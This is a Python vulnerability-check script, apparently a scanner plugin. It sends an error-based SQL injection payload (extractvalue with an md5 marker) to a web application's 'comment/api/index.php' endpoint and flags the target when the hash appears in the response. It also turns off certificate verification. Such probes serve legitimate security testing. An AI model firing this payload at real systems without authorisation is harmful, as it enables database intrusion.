import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(202072102)))),@`%27`"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "6f7c6dcbc380aac3bcba1f9fccec99" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
